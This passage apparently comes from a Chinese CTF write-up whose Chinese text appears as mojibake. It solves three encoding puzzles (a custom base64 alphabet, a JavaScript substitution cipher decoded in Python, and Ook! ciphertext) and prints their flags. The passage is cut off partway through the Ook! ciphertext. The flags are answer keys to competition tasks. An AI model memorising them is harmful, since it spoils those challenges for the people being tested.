<h3 id="CISCN-2023-åˆèµ›-Sign-in-passwd"><a href="#CISCN-2023-åˆèµ›-Sign-in-passwd" class="headerlink" title="[CISCN 2023 åˆèµ›]Sign_in_passwd"></a>[CISCN 2023 åˆèµ›]Sign_in_passwd</h3><p>é¢˜ç›®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D</span><br><span class="line">GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒè¡Œå¸¦%3D å…ˆè¿›è¡Œurlè§£ç  è§£ç å65ä½  æ¨æµ‹æ˜¯base64ç½®æ¢è¡¨ ç›´æ¥ä¸Š CyberChef å¯¹ç¬¬ä¸€è¡Œè§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5</span><br></pre></td></tr></table></figure>

<p><img src="/posts/555436f5/2.png" alt="æˆªå›¾"></p>
<p>å¾—åˆ°flag  flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4}</p>
<h3 id="GDOUCTF-2023-Absolute-Baby-Encrytpion"><a href="#GDOUCTF-2023-Absolute-Baby-Encrytpion" class="headerlink" title="[GDOUCTF 2023]Absolute_Baby_Encrytpion"></a>[GDOUCTF 2023]Absolute_Baby_Encrytpion</h3><p>é¢˜ç›®æè¿°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Aliceç”¨è„šæœ¬å‘Bobå‘é€äº†ä»¥ä¸‹æ¶ˆæ¯ã€‚ è¿™æ˜¯ç”¨JSå†™çš„ã€‚ Bobå¯¹JSä¸€æ— æ‰€çŸ¥ã€‚ ä½ èƒ½å¸®å¿™çœ‹çœ‹ç•™è¨€å—ï¼Ÿ</span><br><span class="line"></span><br><span class="line">+&#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>jsè„šæœ¬</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> messagetoEncrypt = <span class="title function_">prompt</span>(<span class="string">&quot;Enter a string: &quot;</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line"><span class="keyword">let</span> charArray = messagetoEncrypt.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> encryptedString = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> hasInvalidCharacter = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; charArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (charArray[i]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;^&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;j&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;@&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;`&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;^&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;`&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;\&quot;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;|&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;:&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\&quot;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            hasInvalidCharacter = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hasInvalidCharacter) &#123;</span><br><span class="line">    encryptedString = <span class="string">&quot;Invalid String!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Your encoded string is <span class="subst">$&#123;encryptedString&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®jsè„šæœ¬ æ˜¯ä¸€ä¸ªå­—æ¯ç¬¦å·ç½®æ¢è¡¨  pyè½¬æˆå­—å…¸</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">list</span> = &#123;<span class="string">&#x27;!&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;)&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;]&#x27;</span>: <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;$&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;*&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;#&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;?&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;^&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;~&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;:&#x27;</span>: <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;`&#x27;</span>: <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;;&#x27;</span>: <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\&#x27;</span>: <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;.&#x27;</span>: <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%&#x27;</span>: <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;,&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;@&#x27;</span>: <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">cipher =<span class="string">&#x27; &#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n &#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    m  += <span class="built_in">list</span>[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;c0rrectly_decrypted_the_$ecret_flag_encrypted_with_5up3r_easy_b@by_encryp7ion_alg0r!thm_written_in_vanil1a_js&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="NISACTF-2022-normal-ã€å¥—å¨ƒæ-Ook-ã€‘"><a href="#NISACTF-2022-normal-ã€å¥—å¨ƒæ-Ook-ã€‘" class="headerlink" title="[NISACTF 2022]normal ã€å¥—å¨ƒæ Ook!ã€‘"></a>[NISACTF 2022]normal ã€å¥—å¨ƒæ Ook!ã€‘</h3><p>é¢˜ç›®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..... ..... ..... ...!? !!.?. ..... ..... ..... ..?.? !.?.. ..... .....</span><br><span class="line">..... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .....</span><br><span class="line">!.!!! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .!... ....! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ..... .!.?. ..... ..... ..!?! !.?.. ..... ..... ?.?!. ?....</span><br><span class="line">..... ..... ....! .!!!! !!!!! !!!!! !.?.. ..... ....! ?!!.? ..... .....</span><br><span class="line">?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!!</span><br><span class="line">!!!!! .!... ..... ..... !.... ...!. ?.... ..... ..!?! !.?.. ..... ...?.</span><br><span class="line">?!.?. ..... ..... ..... ....! .?... ..... ...!? !!.?. ..... ....? .?!.?</span><br><span class="line">!.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!.</span><br><span class="line">!.... ..... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... .....</span><br><span class="line">..... ...!. !!!!! !!!!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! 